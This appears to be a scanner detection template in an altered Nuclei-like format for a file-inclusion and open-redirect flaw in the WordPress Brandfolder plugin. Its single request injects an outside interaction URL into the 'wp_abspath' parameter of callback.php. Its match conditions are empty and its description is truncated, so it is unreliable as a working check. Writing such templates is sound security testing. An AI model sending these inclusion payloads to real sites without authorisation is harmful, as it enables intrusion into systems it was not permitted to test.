id: brandfolder-open-redirect
brief:
    title: WordPress Brandfolder - Open Redirect (RFI & LFI)
    by: 0x_Akoko
    level: medium
    about: WordPress Brandfolder is vulnerable to remote/local file inclusion and allows remote attackers to inject an arbitrary URL into the 'callback.php' endpoint via the 'wp_abspath' parameter which will ...
    label:
        - wp
        - brandfolder
        - edb
        - wpscan
        - wp-plugin
        - redirect
        - rfi
        - wordpress
        - lfi
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://interact.sh/'
      signs: []
